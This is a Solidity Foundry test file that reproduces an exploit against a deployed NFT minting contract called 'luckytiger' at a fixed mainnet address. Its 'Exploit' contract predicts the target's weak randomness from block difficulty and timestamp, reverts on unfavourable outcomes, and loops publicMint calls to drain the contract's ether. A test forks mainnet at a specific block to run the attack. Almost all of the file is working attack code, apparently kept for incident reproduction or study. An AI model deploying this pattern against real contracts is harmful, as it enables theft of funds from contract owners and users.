pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interfaces/Cheatcodes.sol";

interface Iluckytiger{
    function publicMint() external payable;
    function tokenId_luckys(uint256 _tokenId) external returns(bool);
}

contract Exploit{
    Iluckytiger luckytiger = Iluckytiger(0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967);
    function hack(uint256 num) public payable{
        uint256 random = uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp)));
        uint256 rand = random%2;
        require(rand != 0, "You are not so lucky");   
        for (uint i = 0; i < num; i++){  
            if(address(luckytiger).balance >= 0.02 ether){
                luckytiger.publicMint{value: msg.value}();
            }
        }
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes memory data
    ) public returns (bytes4) {
        return this.onERC721Received.selector;
    }

    fallback() external payable{}

}
contract test is Test{
    Exploit internal exploit;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Iluckytiger luckytiger = Iluckytiger(0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967);

    function setUp() public {
        cheats.createSelectFork("mainnet", 15403428);
    }

    function testExploit() public {
        exploit = new Exploit();
        exploit.hack{value: 0.01 ether}(50);
        console.log(address(exploit).balance);

    }
} 